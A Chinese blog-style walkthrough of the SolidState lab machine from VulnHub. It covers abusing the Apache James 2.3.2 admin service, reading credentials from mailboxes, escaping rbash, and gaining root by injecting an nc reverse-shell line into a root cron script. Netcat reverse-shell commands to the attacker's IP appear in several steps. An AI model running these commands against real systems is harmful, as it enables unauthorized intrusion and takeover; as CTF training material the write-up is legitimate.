> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/1UarBclRp1aLmDUEiYZhig)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **41** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/5ria5WVLahGj8W7vu6J2jzTGqRtEaL6ib9CDzENq8PCEZADfU3JXsmibNacJhY7rooNoYIpCsUytNS0k4UcSsnRfw/640?wx_fmt=png)

靶机地址：https://www.vulnhub.com/entry/solidstate-1,261/

靶机难度：中级（CTF）

靶机发布日期：2018 年 9 月 12 日

靶机描述：

它最初是为 HackTheBox 创建的

目标：得到 root 权限 & 找到 flag.txt

请注意：对于所有这些计算机，我已经使用 VMware 运行下载的计算机。我将使用 Kali Linux 作为解决该 CTF 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/XxZOJAn437TAwOeYFBI2JiamRa34iaqY1IAPG9MaXSIKgPlBicRoyoyHPr0q6YUAhLTYebc4z2qjok0r1riadSujeg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/FAf3SbzREv1yEsWZqMDExrPvhOutWaLH9VkgQiaS11ia5Y3Xun2olnDwIhLlOiaMWe0UGE1uMpeHx4ma7lOjn8xpQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/VtRWAxRvv7GXYcc2w086cwOxcc4libkI8ibn6rD3yBlZ7vd0fH2TaYMKicrgibMcRBbxTQ5fbCJs4AgldkHtBiaPOdA/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_svg/kSiaeFj92SMyLghhftE2Ls37f4uZP8ZCOxbnsSQ1P6n6AsfOBzt5PrmdTAS3OOhPMXiabAsyKKf4QuEfoCrj9yLNlmkc5ddlpQ/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJR4Yz4b0jxos7DmwhMkTdTzGiae82MQdlL2cSBdhtiaR1qqPJ7KhVeWEw/640?wx_fmt=png)我们在 VM 中需要确定攻击目标的 IP 地址，需要使用 nmap 获取目标 IP 地址：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJXVJ9egPLxlj7zwTz5xkOqSico3BaQZTibU36g3JZQqafia4sV43ZM2o7g/640?wx_fmt=png)

我们已经找到了此次 CTF 目标计算机 IP 地址：

```
192.168.182.139
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJQ6bUxKh79yiblmQTS6PN1vUtibuBcCMexjibshFBato0zvHvgAm9xzDvg/640?wx_fmt=png)

nmap 发现了 22（ssh）、25（smtp）、80（http）、110（pop3）、119（nntp）、4555（admin）端口是开放的...4555 还是 james-admin JAMES Remote Admin 2.3.2... 存在漏洞

```
[链接](https://www.exploit-db.com/exploits/35513)
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJiabzJQnEqPicyRtJ5qa47uHkNQqK9k6aGYHZnYfuJOyU5QMKFOG9PXcQ/640?wx_fmt=png)

dirb 和 nikto，以及 gobuster 都没发现什么...

这边直接看看 4555... 这边需要用 nc 链接... 因为是 Remote Admin Service...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJFO6lSRhNCehWo4rKlhziaww3EFJ0It6etMiar5qH4cYZPzGza8xib437Q/640?wx_fmt=png)

```
nc 192.168.182.139 4555
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJYarwL6nnP2g9O89cQRWBI1tgwnFntyxp0vjpIzyl2pjfmSJWY4pcWA/640?wx_fmt=png)

listusers 命令可以发现服务器上的邮件列表... 发现五个用户...

还能执行 `setpassword [username] [password] `

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJrUAVcoostrwziaOEicm979lSbM2mFvwx7BlGvEl9u3wkFlsRA6kx8ISw/640?wx_fmt=png)

使用命令将五个用户都修改密码成 dayu... 方便我们去渗透...

现在有了 pop3 的用户名密码，进去看看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJfib828Bu5o7wibzogGNIoZSx5vmDnj2eufesTVmdbsdczHFLeOLn9fYQ/640?wx_fmt=png)

john 的邮件信息是祝我好运... 没啥有用的.. 继续换...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJL2WTib0o8Byp0icUI2hkfqkch6H94S0jF25Pu6ltYaEtlkavySwDrtOg/640?wx_fmt=png)

可以看到 James 从管理员帐户向 Mindy 发送了邮件，并共享了他的 SSH 登录凭据，在 mindy 用户邮件中看到了账号密码...pass:

```
P@55W0rd1!2@
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJnkkoe96iaESISj3FLYeiaicGg1FR8L4qCgavnPqyrjRbWgY77Viaw7x7Mw/640?wx_fmt=png)

成功登陆 mindy 用户...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJruxWn8DMuUnwByvQ5UfubL8KfR8pwua7NG4ZFpYHVRYsjgERYfAyIA/640?wx_fmt=png)

可以看到 mindy 用户可以利用 / bin/rbash / 进行反向 shell 提权... 或者利用前面 nmap 就知道了 Apache James Server 2.3.2 在运行着... 并利用 35513EXP 进行渗透...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJQjM820P1tUSut7u4enMTK5ia9qUwiaJ8iadNoNXAM8sBwkrtKIjAM4fag/640?wx_fmt=png)

```
ssh mindy@192.168.182.139 "export TERM=xterm; python -c 'import pty; pty.spawn(\"/bin/sh\")'"
```

直接利用一句话就能提权...

或者用：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJjbPLwt0THg3X4Upu40Wyop7UCf2iac86FH0IYy49vX2AadQW1Nibj33Q/640?wx_fmt=png)

在本地找就行，或者在 exploit 上下载也行...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJurfSEhHS6FYQq1fickJjn7pCpusic7Cpqm8uWb25MNBt8CicSamkVe9eA/640?wx_fmt=png)

这要做个修改...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJ8Fr8BftPaHzG3dzA2ODOq1mOv8VVdOayLSE6qMic19bummg8ibI1Suicw/640?wx_fmt=png)

```
nc -e /bin/sh 192.168.182.149 8000
```

  （攻击者 IP）  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJPcZZrslvE3B38PU7hT4FRFyDFKcAeNz4uqqTSYmcL9fa07rfk7N9nw/640?wx_fmt=png)

```
python 35513.py 192.168.182.139
```

修改好后，直接执行即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJ77yXEO22RWNKclLXd6vjYjaL9nk7YEzgiaeJ29CWVBOIdOLpxaCNe4g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJXY37W1NnTmnWzAxpJHox62cshbXl12O5J242tNY3LuZbFLEtWbricWg/640?wx_fmt=png)

重新 ssh 访问 mindy 用户后，直接本地开启 8000 监听即可... 成功提权... 还有各种方法原理是一样的，就不说了...

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJXpJWRfhq6UUQpw4M1aibFZ41002za9m6LhrwASWpOO4Z6mKQWf9cuFg/640?wx_fmt=png)

在 mindy 用户下完成了第一个挑战，查看到了 user 内容...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJQ0Ha4Y28M2la5tVK6fHjskyUA4gwzX2cxPMLagS1EdrjQKPgrEwytA/640?wx_fmt=png)

```
ps aux | grep james
```

因为前面能进入 mindy 用户是通过 James 那里得到的提示，james 发了邮件给 mindy... 这边我查看下 james 运行过程..

显示了 opt 作为根进程.. 进去看看

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJwz2HTKFraHToUrle6HLB0npK0glPzKd6xjjNib8HB3peX33IjYRzccw/640?wx_fmt=png)

有个 tmp.py 程序应该可以利用下，试试

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJDjy1uuiaQrQSHUg0Gu9LT6kMcguUJ208hicicwZCVeA7S3fS76hyC3Uicw/640?wx_fmt=png)

直接写入即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJGO8uibJnI87t4rVxod41Gx5GgycMmAFvkExdZcVtjCeJT4yh6xsgiaIw/640?wx_fmt=png)

```
echo 'import os; os.system("/bin/nc 192.168.182.149 4444 -e /bin/bash")' > /opt/tmp.py
```

```
或者命令：echo "os.system('/bin/nc -e /bin/bash 192.168.182.149 4444')" >> tmp.py
```

或者在本地创建 tmp.py 文件，然后 wget 上传到 tmp 目录 cp 放到 opt 目录运行即可....

这边 crontab 在 root 的帐户下运行的，大约 2~3 分钟就会自动运行一次.. 等待即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMwDiblBvQBeBiaLOzfq3gIvJtqJERZbmwU0yZbgw7FGtPJfFkTF5YGUgkl4uUBejdXoqAia39pObOvA/640?wx_fmt=png)

成功提权... 获得 root 权限查看 flag....

![](https://mmbiz.qpic.cn/mmbiz_png/5ria5WVLahGj8W7vu6J2jzTGqRtEaL6ib9CDzENq8PCEZADfU3JXsmibNacJhY7rooNoYIpCsUytNS0k4UcSsnRfw/640?wx_fmt=png)

这篇主要熟悉 Apache James Server 2.3.2 可利用漏洞... 或者熟悉文件上传 python 利用也可以... 最后就是找到用户底层可运行利用的 py、php 和 sh 等文件，进行修改利用即可...

由于我们已经成功得到 root 权限和 flag，因此完成了简单靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/XxZOJAn437TAwOeYFBI2JiamRa34iaqY1IAPG9MaXSIKgPlBicRoyoyHPr0q6YUAhLTYebc4z2qjok0r1riadSujeg/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)